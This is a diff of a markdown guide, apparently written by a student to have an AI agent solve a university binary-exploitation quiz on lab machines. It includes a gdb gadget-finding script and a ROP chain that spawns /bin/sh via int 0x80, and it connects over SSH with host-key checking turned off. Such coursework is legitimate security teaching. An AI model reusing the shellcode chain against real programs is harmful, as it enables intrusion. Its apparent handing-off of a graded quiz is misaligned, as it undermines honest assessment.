@@ -23,15 +23,15 @@ I am student `apieri01`, group 6.
 
 3. **SSH to the lab machine** using the instructions in `SSH_SETUP.md`:
    - You are already on a lab machine — use `ssh lab103` (key is in NFS home `~/.ssh/lab_key`)
-   - Or: `ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.89`
-   - If 10.16.13.89 is down, try other 103wsX IPs in the 10.16.13.x range
+   - Or: `ssh -i ~/.ssh/lab_key -o StrictHostKeyChecking=no apieri01@10.16.13.53`
+   - If 10.16.13.53 (ws15) is down, try 10.16.13.89 (ws14) or other 103wsX IPs in the 10.16.13.x range
    - Once connected: `cd ~/326_quiz3` (repo is already cloned there)
    - If repo not present: `git clone https://github.com/andreas1612/326_quiz3.git ~/326_quiz3`
 
 4. **I will tell you where the quiz binaries are.** Upload them to the lab:
    ```bash
-   mkdir -p ~/quiz4_examples/g6
-   scp -i ~/.ssh/lab_key /path/to/bin.1 /path/to/bin.2 apieri01@10.16.13.89:~/quiz4_examples/g6/
+   mkdir -p ~/326_quiz3/g6
+   scp -i ~/.ssh/lab_key /path/to/bin.1 /path/to/bin.2 apieri01@10.16.13.53:~/326_quiz3/g6/
    ```
 
 ---
@@ -74,7 +74,7 @@ Expected (from example sets): `mmap_base = 0x07049000`
 import gdb
 gdb.execute("set pagination off")
 gdb.execute("b *0x8049376")   # after memcpy in display_file — adjust if different binary
-gdb.execute("run g6/exploit.dummy")
+gdb.execute("run exploit.dummy")
 for i in range(0, 32, 4):
     addr = 0x070493e0 + i
     v = int(gdb.parse_and_eval("*((unsigned int*)%d)" % addr))
@@ -83,9 +83,9 @@ for i in range(0, 32, 4):
 gdb.execute("quit")
 ```
 ```bash
-python3 -c "print('60 ' + 'A'*60)" > g6/exploit.dummy
+python3 -c "print('60 ' + 'A'*60)" > exploit.dummy
 env -i TEMP=1000 HOME=~ PATH=/usr/bin:/bin setarch i686 -R --3gb \
-  gdb -batch -ex "source /tmp/gdb_verify.py" g6/bin.1 2>&1 | grep "0x07049"
+  gdb -batch -ex "source /tmp/gdb_verify.py" ./bin.1 2>&1 | grep "0x07049"
 ```
 The address where you see `31 c0 c3` or `58 5b c3` at the start = actual gadget_base.
 
@@ -111,13 +111,13 @@ chain += p32(G_POP) + b'//sh' + p32(WR+4) + p32(G_MPTR)
 chain += p32(G_POP) + p32(WR) + p32(0x41414141) + p32(G_MEBX)
 chain += p32(G_XECX) + p32(G_XEDX) + p32(G_XEAX) + p32(G_MOVAL) + p32(G_INT80)
 data = str(len(chain)).encode() + b' ' + chain
-with open('g6/exploit.1', 'wb') as f: f.write(data)
+with open('exploit.1', 'wb') as f: f.write(data)
 ```
 
 ### Step 7 — Verify
 ```bash
-echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.1 g6/exploit.1
-echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g6/bin.2 g6/exploit.2
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.1 ./exploit.1
+echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 ./exploit.2
 ```
 Expected: `uid=9992(apieri01) gid=3633(cs24) groups=3633(cs24)`
 
